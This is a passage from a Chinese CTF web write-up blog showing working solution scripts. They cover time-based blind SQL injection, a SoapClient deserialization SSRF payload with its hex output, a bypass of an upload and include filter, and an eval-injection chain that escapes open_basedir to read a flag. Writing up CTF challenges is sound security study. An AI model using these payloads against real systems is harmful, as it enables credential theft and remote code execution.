&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">while line:</span><br><span class="line">    line &#x3D; f.readline()</span><br><span class="line">    dict[line[0:5]]&#x3D;line[-4:-1]</span><br><span class="line"></span><br><span class="line">print &quot;okkkk&quot;</span><br><span class="line">#Login in</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;477c9576-c06d-4c50-84ee-7cdefa94013d.node1.buuoj.cn&#x2F;index.php?action&#x3D;login&quot;</span><br><span class="line">r &#x3D; s.get(url)</span><br><span class="line">content &#x3D; BeautifulSoup(r.text , &#39;lxml&#39;)</span><br><span class="line">tmp &#x3D; content.select(&#39;body &gt; div &gt; form &gt; label:nth-child(7)&#39;)[0].text</span><br><span class="line">tmp &#x3D; tmp.split(&quot;\n&quot;)</span><br><span class="line">#Get</span><br><span class="line">code &#x3D; tmp[0].encode(&#39;gbk&#39;)[-7:-2]</span><br><span class="line">print code</span><br><span class="line">print dict[code]</span><br><span class="line">data &#x3D; &#123;</span><br><span class="line">    &#39;username&#39;:&quot;1111&quot;,</span><br><span class="line">    &#39;password&#39;:&quot;1111&quot;,</span><br><span class="line">    &quot;code&quot;:dict[code]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r &#x3D; s.post(url,data)</span><br><span class="line">print r.content</span><br><span class="line"></span><br><span class="line">#time-blind-sqli</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;477c9576-c06d-4c50-84ee-7cdefa94013d.node1.buuoj.cn&#x2F;index.php?action&#x3D;publish&quot;</span><br><span class="line">flag &#x3D; &quot;&quot;</span><br><span class="line">tmp &#x3D; 0</span><br><span class="line">for i in range(1,100):</span><br><span class="line">    if tmp &#x3D;&#x3D; 1:</span><br><span class="line">        break</span><br><span class="line">    tmp &#x3D; 1</span><br><span class="line">    for j in range(32,126):</span><br><span class="line">        signature &#x3D; &quot;a&#96;,if(ascii(substr((select password from ctf_users limit 1),&quot;+str(i)+&quot;,1))&#x3D;&quot;+str(j)+&quot;,sleep(5),1)); -- -&quot;</span><br><span class="line">        print(signature)</span><br><span class="line">        data &#x3D; &#123;</span><br><span class="line">            &quot;signature&quot;:signature,</span><br><span class="line">            &quot;mood&quot;:&quot;1&quot;</span><br><span class="line">        &#125;</span><br><span class="line">        try:</span><br><span class="line">            r&#x3D;s.post(url&#x3D;url,data&#x3D;data,timeout&#x3D;5)</span><br><span class="line">        except requests.exceptions.ReadTimeout as e:</span><br><span class="line">            flag +&#x3D; chr(j)</span><br><span class="line">            tmp &#x3D; 0</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure>
+
+<p>解密一下md5，发现密码是jaivypassword</p>
+<p>以为登陆就万事大吉了，太天真了，登不不上去。。。应该是ssrf,找一下ssrf的可控点，问题出在showmess函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">function showmess()</span><br><span class="line">    &#123;</span><br><span class="line">        if(!$this-&gt;check_login()) return false;</span><br><span class="line">        if($this-&gt;is_admin &#x3D;&#x3D; 0)</span><br><span class="line">        &#123;</span><br><span class="line">            &#x2F;&#x2F;id,sig,mood,ip,country,subtime</span><br><span class="line">            $db &#x3D; new Db();</span><br><span class="line">            @$ret &#x3D; $db-&gt;select(array(&#39;username&#39;,&#39;signature&#39;,&#39;mood&#39;,&#39;id&#39;),&#39;ctf_user_signature&#39;,&quot;userid &#x3D; $this-&gt;userid order by id desc&quot;);</span><br><span class="line">            if($ret) &#123;</span><br><span class="line">                $data &#x3D; array();</span><br><span class="line">                while ($row &#x3D; $ret-&gt;fetch_row()) &#123;</span><br><span class="line">                    $sig &#x3D; $row[1];</span><br><span class="line">                    $mood &#x3D; unserialize($row[2]);</span><br><span class="line">                    $country &#x3D; $mood-&gt;getcountry();</span><br><span class="line">                    $ip &#x3D; $mood-&gt;ip;</span><br><span class="line">                    $subtime &#x3D; $mood-&gt;getsubtime();</span><br><span class="line">                    $allmess &#x3D; array(&#39;id&#39;&#x3D;&gt;$row[3],&#39;sig&#39; &#x3D;&gt; $sig, &#39;mood&#39; &#x3D;&gt; $mood, &#39;ip&#39; &#x3D;&gt; $ip, &#39;country&#39; &#x3D;&gt; $country, &#39;subtime&#39; &#x3D;&gt; $subtime);</span><br><span class="line">                    array_push($data, $allmess);</span><br><span class="line">                &#125;</span><br><span class="line">                $data &#x3D; json_encode(array(&#39;code&#39;&#x3D;&gt;0,&#39;data&#39;&#x3D;&gt;$data));</span><br><span class="line">                return $data;</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">                return false;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        $filenames &#x3D; scandir(&#39;adminpic&#x2F;&#39;);</span><br><span class="line">        array_splice($filenames, 0, 2);</span><br><span class="line">        return json_encode(array(&#39;code&#39;&#x3D;&gt;1,&#39;data&#39;&#x3D;&gt;$filenames));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里有反序列化函数并且存在方法的调用，可以想到SoapClient内置方法在调用不存在的方法时会触发call函数产生ssrf（我是看到wp才第一次知道。。。），既然看到了反序列化的点了，那么接着追踪一下序列化数据的来源，代码如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_POST[&#39;signature&#39;]) &amp;&amp; isset($_POST[&#39;mood&#39;])) &#123;</span><br><span class="line"></span><br><span class="line">            $mood &#x3D; addslashes(serialize(new Mood((int)$_POST[&#39;mood&#39;],get_ip())));</span><br><span class="line">            $db &#x3D; new Db();</span><br><span class="line">            @$ret &#x3D; $db-&gt;insert(array(&#39;userid&#39;,&#39;username&#39;,&#39;signature&#39;,&#39;mood&#39;),&#39;ctf_user_signature&#39;,array($this-&gt;userid,$this-&gt;username,$_POST[&#39;signature&#39;],$mood));</span><br><span class="line">            if($ret)</span><br><span class="line">                return true;</span><br><span class="line">            else</span><br><span class="line">                return false;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里有个int限制，我们直接通过十六进制插入到数据库就行，exp如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$target &#x3D; &#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;index.php?action&#x3D;login&#39;;</span><br><span class="line">$post_string &#x3D; &#39;username&#x3D;admin&amp;password&#x3D;jaivypassword&amp;code&#x3D;0feeb&#39;;</span><br><span class="line">$headers &#x3D; array(</span><br><span class="line">    &#39;X-Forwarded-For: 127.0.0.1&#39;,</span><br><span class="line">    &#39;Cookie: PHPSESSID&#x3D;p1dj1cjhpc90jjk8atvo3ku8m2&#39;</span><br><span class="line">    );</span><br><span class="line">$b &#x3D; new SoapClient(null,array(&#39;location&#39; &#x3D;&gt; $target,&#39;user_agent&#39;&#x3D;&gt;&#39;wupco^^Content-Type: application&#x2F;x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers).&#39;^^Content-Length: &#39;.(string)strlen($post_string).&#39;^^^^&#39;.$post_string,&#39;uri&#39;      &#x3D;&gt; &quot;aaab&quot;));</span><br><span class="line"></span><br><span class="line">$aaa &#x3D; serialize($b);</span><br><span class="line">$aaa &#x3D; str_replace(&#39;^^&#39;,&quot;\r\n&quot;,$aaa);</span><br><span class="line">$aaa &#x3D; str_replace(&#39;&amp;&#39;,&#39;&amp;&#39;,$aaa);</span><br><span class="line">echo bin2hex($aaa);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>得到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4f3a31303a22536f6170436c69656e74223a353a7b733a333a22757269223b733a343a2261616162223b733a383a226c6f636174696f6e223b733a34383a22687474703a2f2f3132372e302e302e312f776562312f6e65772f696e6465782e7068703f616374696f6e3d6c6f67696e223b733a31353a225f73747265616d5f636f6e74657874223b693a303b733a31313a225f757365725f6167656e74223b733a3230303a22777570636f0d0a436f6e74656e742d547970653a206170706c69636174696f6e2f782d7777772d666f726d2d75726c656e636f6465640d0a582d466f727761726465642d466f723a203132372e302e302e310d0a436f6f6b69653a205048505345535349443d7031646a31636a68706339306a6a6b386174766f336b75386d320d0a436f6e74656e742d4c656e6774683a2034380d0a0d0a757365726e616d653d61646d696e2670617373776f72643d6a6169767970617373776f726426636f64653d3066656562223b733a31333a225f736f61705f76657273696f6e223b693a313b7d</span><br></pre></td></tr></table></figure>
+
+<p>理论上把这个作为mood传入存入数据库，访问showmess时反序列化时会自动ssrf，phpsessionid会变成我们设定的值，然后再用这个cookie登录</p>
+<p>但是我失败了😥😭</p>
+<p>getshell之后，服务器上没有发现flag，看一下/etc/hosts，看啊可能内网网段，发现0.2的地方有猫腻</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$sandbox = <span class="string">'/var/sandbox/'</span> . md5(<span class="string">"prefix"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">@mkdir($sandbox);</span><br><span class="line">@chdir($sandbox);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>])&#123;</span><br><span class="line">    $filename = !<span class="keyword">empty</span>($_POST[<span class="string">'file'</span>]) ? $_POST[<span class="string">'file'</span>] : $_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>];</span><br><span class="line">    <span class="keyword">if</span> (!is_array($filename)) &#123;</span><br><span class="line">        $filename = explode(<span class="string">'.'</span>, $filename);</span><br><span class="line">    &#125;</span><br><span class="line">    $ext = end($filename);</span><br><span class="line">    <span class="keyword">if</span>($ext==$filename[count($filename) - <span class="number">1</span>])&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"try again!!!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $new_name = (string)rand(<span class="number">100</span>,<span class="number">999</span>).<span class="string">"."</span>.$ext;</span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>],$new_name);</span><br><span class="line">    $_ = $_POST[<span class="string">'hello'</span>];</span><br><span class="line">    <span class="keyword">if</span>(@substr(file($_)[<span class="number">0</span>],<span class="number">0</span>,<span class="number">6</span>)===<span class="string">'@&lt;?php'</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(strpos($_,$new_name)===<span class="keyword">false</span>) &#123;</span><br><span class="line">            <span class="keyword">include</span>($_);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"you can do it!"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unlink($new_name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>end()后缀名绕过，是取输入的最后一个数据</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$a[<span class="number">2</span>] = <span class="string">'222'</span>;</span><br><span class="line">	$a[<span class="number">1</span>] = <span class="string">'111'</span>;</span><br><span class="line">	$a[<span class="number">0</span>] = <span class="string">'000'</span>;</span><br><span class="line">	</span><br><span class="line">	$end = end($a);</span><br><span class="line">	var_dump($end);</span><br><span class="line">	</span><br><span class="line">	$arr = $a[count($a)<span class="number">-1</span>]</span><br><span class="line">	var_dump($arr);</span><br><span class="line">?&gt;</span><br><span class="line">    </span><br><span class="line">结果：</span><br><span class="line">string(<span class="number">3</span>) <span class="string">"000"</span></span><br><span class="line">string(<span class="number">3</span>) <span class="string">"222"</span></span><br></pre></td></tr></table></figure>
+
+<p><code>unlink</code>的绕过，加    <code>/.</code>    或    <code>../</code>    绕过。</p>
+<blockquote>
+<p>加    /.    是linux下的特性</p>
+</blockquote>
+<blockquote>
+<p>所以，如果我们传入的是文件名中包含一个不存在的路径，写入的时候因为会处理掉“../”等相对路径，所以不会出错；判断、删除的时候因为不会处理，所以就会出现“No such file or directory”的错误。</p>
+</blockquote>
+<p>接下来传入hehe参数，加    <code>../</code>产生的随机数会被当成路径，或者爆破也行</p>
+<p>绕过strpos也很简单，<code>./233.php</code>    即可</p>
+<h2><span id="giftbox">GiftBox</span></h2><p>进入页面后ls一下发现一个md文件，</p>
+<p>很明显发现存在注入</p>
+<p>login 命令存在注入点<br>首先通过注入获得admin密码</p>
+<p>开始没有意识到totp到interval=5，只好用前端去爆破<br>之后</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pyotp <span class="keyword">import</span> TOTP</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://222.85.25.41:8090/shell.php"</span></span><br><span class="line">conn = requests.Session()</span><br><span class="line">totp = TOTP(<span class="string">'GAXG24JTMZXGKZBU'</span>,<span class="number">8</span>,interval=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span><span class="params">(content)</span>:</span></span><br><span class="line">    param = &#123;</span><br><span class="line">        <span class="string">'a'</span>:content,</span><br><span class="line">        <span class="string">"totp"</span>:totp.now(),</span><br><span class="line">        <span class="string">"x"</span>:<span class="string">"""</span></span><br><span class="line"><span class="string">chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo(file_get_contents('flag'));</span></span><br><span class="line"><span class="string">        """</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    resp = conn.get(url,params=param)</span><br><span class="line">    print(resp.text)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    send(<span class="string">"login admin hint&#123;G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333&#125;"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">destruct</span><span class="params">()</span>:</span></span><br><span class="line">    send(<span class="string">"destruct"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">launch</span><span class="params">()</span>:</span></span><br><span class="line">    send(<span class="string">"launch"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(name,val)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span>(len(val) &lt; <span class="number">13</span>)</span><br><span class="line">    send(<span class="string">"targeting &#123;&#125; &#123;&#125;"</span>.format(name,val))</span><br><span class="line"></span><br><span class="line">login()</span><br><span class="line">destruct()</span><br><span class="line">add(<span class="string">"b"</span>,<span class="string">"&#123;$_GET&#123;x&#125;&#125;"</span>)  </span><br><span class="line">add(<span class="string">"c"</span>,<span class="string">"$&#123;eval($b)&#125;"</span>)  </span><br><span class="line">add(<span class="string">"d"</span>,<span class="string">"$d"</span>)  </span><br><span class="line">launch()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3><span id="参考链接">参考链接：</span></h3><p><a href="https://mp.weixin.qq.com/s/cUP36TSDFVJPm0Bx1HC5ww" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/cUP36TSDFVJPm0Bx1HC5ww</a></p>
+<p><a href="http://blog.chinaunix.net/uid-27070210-id-3255947.html" target="_blank" rel="noopener">http://blog.chinaunix.net/uid-27070210-id-3255947.html</a></p>
+<p><a href="https://lihuaiqiu.github.io/2019/08/27/De1CTF2019/#more" target="_blank" rel="noopener">https://lihuaiqiu.github.io/2019/08/27/De1CTF2019/#more</a></p>
+<p><a href="https://blog.csdn.net/tszupup/article/details/83536673" target="_blank" rel="noopener">https://blog.csdn.net/tszupup/article/details/83536673</a></p>
+<p><a href="https://cloud.tencent.com/developer/article/1360551" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1360551</a></p>
+
+            </div>
+          
+
+    
+      <footer class="post-footer">
+
+        
+         <div>    
+          
+          <ul class="post-copyright">
+             <li class="post-copyright-link">
+              <strong>本文作者：</strong>
+              <a href="/" title="欢迎访问 glotozz 的个人博客">glotozz</a>
+            </li>
+
+            <li class="post-copyright-license">
+              <strong>版权声明： </strong>
+               本博客所有文章除特别声明外，均采用 CC BY-NC-SA 4.0 许可协议。转载请注明出处！
+            </li>
+          </ul>
+        
+      </div>
+      
+        <div class="post-tags">
+          
+            <a href="/tags/wp/" rel="tag"><i class="fa fa-tag"></i> wp</a>
+          
+        </div>
+      
+
+        
+        
+  <nav class="post-nav">
+    
+      <a class="prev" href="/2019/09/02/XNUCA-EZPHP-wp/">
+        <i class="iconfont icon-left"></i>
+        <span class="prev-text nav-default">XNUCA-EZPHP-wp</span>
+        <span class="prev-text nav-mobile">Prev</span>
+      </a>
+    
+    
+      <a class="next" href="/2019/08/27/ogeek-web/">
+        <span class="next-text nav-default">ogeek-web</span>
+        <span class="prev-text nav-mobile">Next</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    
+  </nav>
+
+        
+  <div class="comments" id="comments">
+    
+      <div id="vcomments"></div>
+    
+  </div>
+
+
+      </footer>
+    
+  </article>
+
+    </div>
+
+      </div>
+
+      <footer id="colophon">
+<span class="copyright-year">
+    
+        &copy;
+    
+    2020
+    <span class="footer-author">glotozz.</span>
+    <span class="power-by">
+        Powered by <a class="hexo-link" href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> and <a class="theme-link" href="https://github.com/frostfan/hexo-theme-polarbear" target="_blank" rel="noopener">Polar Bear</a>
+    </span>
+</span>
+
+      </footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div>
+    
+
+
+
+  
+<!-- valine Comments -->
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/xcss/valine@v1.1.7/dist/Valine.min.js"></script>
+<script type="text/javascript">
+    new Valine({
+        el: '#vcomments',
+        notify: false,
+        verify: false,
+        app_id: "d2XJ52o9D5xTnDd2J92VPPna-gzGzoHsz",
+        app_key: "P6wHC0f6Fn02hW8SSdnax8wa",
+        placeholder: "Just go go",
+        avatar: 'mm'
+    });
+</script>
+
+
+    
+
+
+
+
+  
+    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
+  
+
+  
+
+    <script type="text/javascript" src="/js/src/theme.js?v=1.1"></script>
+<script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script>
+
+    <!-- 代码块复制功能 -->
+  <script type="text/javascript" src="/js/src/clipboard.min.js"></script>  
+  <script type="text/javascript" src="/js/src/clipboard-use.js"></script>
+  </body>
+</html>
